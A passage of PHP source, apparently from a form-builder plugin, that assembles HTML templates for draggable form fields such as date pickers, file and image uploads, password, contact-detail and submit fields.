																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																$output .= '<div class="svg_ready input-group">
																			<span data-toggle="dropdown" class="input-group-addon color-select"><span class="caret"></span></span>
																				  <ul class="dropdown-menu">
																					<li><div id="colorpalette"></div></li>
																				  </ul>
																				  <input type="text" id="selected-color" value="" name="color_pallet"  type="text" class="svg_ready error_message form-control  the_input_element" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select a color" title="">
																			</div>
																			 ';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
								
								
//DATE TIME
								$output .= '<div class="field form_field  extended-fields datetime">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon glyphicon-calendar"></i>&nbsp;&nbsp;<span class="field_title">Date+Time</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Date Time</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date" id="datetimepicker" data-format="MM/DD/YYYY hh:mm A" data-language="en">';
															$output .= '<span class="input-group-addon prefix"><span class="glyphicon glyphicon-calendar"></span></span>';
															$output .= '<input type="text" name="data_time" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select a date and time" title="" />';
															$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//DATE
								$output .= '<div class="field form_field extended-fields date">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class=" glyphicon glyphicon-calendar"></i>&nbsp;&nbsp;<span class="field_title">Date</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Date</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date" id="datetimepicker" data-format="MM/DD/YYYY" data-language="en">';
																$output .= '<span class="input-group-addon prefix"><span class="glyphicon glyphicon-calendar"></span></span>';
																$output .= '<input type="text" name="date" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select a date" title="" />';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
								
								
								
//TIME
								$output .= '<div class="field form_field extended-fields time">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class="fa fa-clock-o"></i>&nbsp;&nbsp;<span class="field_title">Time</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Time</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date" id="datetimepicker" data-format="hh:mm A" data-language="en">';
															$output .= '<span class="input-group-addon prefix"><span class="fa fa-clock-o"></span></span>';
															$output .= '<input type="text" name="time" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select a time" title="" />';
															$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';

															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
							
							
							
							/////////SINGLE FILE UPLOAD
								$output .= '<div class="field form_field upload-single common-fields">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class="glyphicon glyphicon-file"></i>&nbsp;&nbsp;<span class="field_title">File Upload</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">File Upload</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																	  <div class="input-group">
																		<div class="the_input_element form-control uneditable-input span3 error_message" data-content="Please select a file" data-secondary-message="Invalid file Extension" data-placement="bottom" data-trigger="fileinput"><i class="glyphicon glyphicon-file fileinput-exists"></i> <span class="fileinput-filename"></span></div>
																		<span class="input-group-addon btn btn-default btn-file postfix"><span class="glyphicon glyphicon-file"></span><input type="file" name="single_file" class="the_input_element"></span>
																		<a href="#" class="input-group-addon btn btn-default fileinput-exists" data-dismiss="fileinput"><span class="fa fa-trash-o"></span></a>
																		<div class="get_file_ext" style="display:none;">doc
docx
mpg
mpeg
mp3
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx</div>
																	  </div>
																	</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
								
/////////IMAGE UPLOAD
								$output .= '<div class="field form_field upload-image common-fields">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-success btn-sm form-control"><i class="glyphicon glyphicon-picture"></i>&nbsp;&nbsp;<span class="field_title">Image Upload</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Image Upload</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																		  <div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 200px; height: 150px;"></div>
																		  <div>
																			<span class="btn btn-default btn-file the_input_element error_message" data-content="Please select an image" data-secondary-message="Invalid image extension" data-placement="top"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span><input type="file" name="image_upload" ></span>
																			<a href="#" class="btn btn-default fileinput-exists" data-dismiss="fileinput">Remove</a>
																		  </div>
																		  <div class="get_file_ext" style="display:none;">gif
jpg
jpeg
png
psd
tif
tiff</div>
																		</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';		
							
							
							
							////////////PASSWORD FIELD
								$output .= '<div class="field form_field common-fields text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-key"></i>&nbsp;&nbsp;<span class="field_title">Password Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Password</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<input id="ve_text" type="password" name="text_field" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format form-control" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" data-secondary-message="" title="">';
																		$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';																
//////////SUBMIT BUTTON						
							$output .= '<div class="field form_field custom-fields submit-button" style="width:33%">';
									$output .= '<div class="draggable_object input-group-sm ">';
										$output .= '<div class="btn btn-warning btn-sm form-control"><i class=" glyphicon glyphicon glyphicon-send"></i>&nbsp;&nbsp;<span class="field_title">Submit Button</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 align_right ">';
																		$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">Submit</div><br />
																		<small class="svg_ready"><a href="http://codecanyon.net/user/Basix/portfolio?ref=Basix" target="_blank"></a></small>';
																	$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
							
					
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';
								

/****************************************************/	
/**PREDEFINED FIELDS ********************************/	
/****************************************************/				
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingPF">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapsePF" aria-expanded="true" aria-controls="collapsePF">';
									$output .= '<span class="fa fa-edit"></span>&nbsp;Preset Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapsePF" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingPF">';
							$output .= '<div class="panel-body">';
//NAME FIELD
								$output .= '<div class="field form_field custom-prefix common-fields required" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-user"></i>&nbsp;&nbsp;<span class="field_title">Name</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs"></span><span class="the_label style_bold">Name</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class="fa fa-user"></span></span>';
																$output .= '<input type="text" name="_name" class="error_message required form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message=""/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//SURNAME FIELD
								$output .= '<div class="field form_field custom-prefix common-fields" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-user"></i>&nbsp;&nbsp;<span class="field_title">Surname</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Surname</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class="fa fa-user"></span></span>';
																$output .= '<input type="text" name="surname" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message=""/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//EMAIL FIELD
								$output .= '<div class="field form_field custom-prefix common-fields required" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-envelope"></i>&nbsp;&nbsp;<span class="field_title">Email</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs"></span><span class="the_label style_bold">Email</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class="fa fa-envelope"></span></span>';
																$output .= '<input type="text" name="email" class="error_message required email form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message="Invalid e-mail format"/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';

																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';

//PHONE FIELD
								$output .= '<div class="field form_field custom-prefix common-fields" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-phone"></i>&nbsp;&nbsp;<span class="field_title">Phone</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Phone Number</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class="fa fa-phone"></span></span>';
																$output .= '<input type="text" name="phone" class="error_message phone_number form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message="Invalid e-mail format"/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//ADDRESS FIELD
								$output .= '<div class="field form_field custom-prefix common-fields" >';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-map-marker"></i>&nbsp;&nbsp;<span class="field_title">Address</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Address</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1"><div class="svg_ready">';
																$output .= '<div class="input-group date">';
																$output .= '<span class="input-group-addon prefix "><span class="fa fa-map-marker"></span></span>';
																$output .= '<input type="text" name="address" class="error_message form-control the_input_element " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title="" data-secondary-message="Invalid e-mail format"/>';
																$output .= '</div></div>';
																$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													$output .= '</div>';
												
												
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';

//////////QUERY
								$output .= '<div class="field form_field common-fields required">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn  btn-info btn-sm form-control"><i class="fa fa-comment"></i>&nbsp;&nbsp;<span class="field_title">Query</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs"></span><span class="the_label style_bold">Query</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<textarea name="query" id="textarea" placeholder=""  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message svg_ready the_input_element textarea required pre-format form-control" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title=""></textarea>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';
															$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';

																
//SUBMIT BUTTON
							$output .= '<div class="field form_field custom-fields submit-button" style="width:33%">';
									$output .= '<div class="draggable_object input-group-sm ">';
										$output .= '<div class="btn btn-warning btn-sm form-control"><i class=" glyphicon glyphicon glyphicon-send"></i>&nbsp;&nbsp;<span class="field_title">Submit</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 align_right ">';
																		$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">Submit</div><br />
																		<small class="svg_ready"><a href="http://codecanyon.net/user/Basix/portfolio?ref=Basix" target="_blank"></a></small>';
																	$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
							
							
						
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';		


/****************************************************/	
/**EXTENDED FIELDS **********************************/	
/****************************************************/		
					/*$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingTwo">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseEF" aria-expanded="true" aria-controls="collapseOne">';
									$output .= '<span class="fa fa-star"></span>&nbsp;Extended Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseEF" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">';
							$output .= '<div class="panel-body">';

//SINGLE IMAGE BUTTONS
													
							
															
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';*/
/****************************************************/	
/**MD FIELDS ************************************/	
/****************************************************/	
				/*	$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingMD">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseMD" aria-expanded="true" aria-controls="collapseMD">';
									$output .= '<span class="fa fa-cubes"></span>&nbsp;Material Design Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseMD" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingMD">';
							$output .= '<div class="panel-body">';
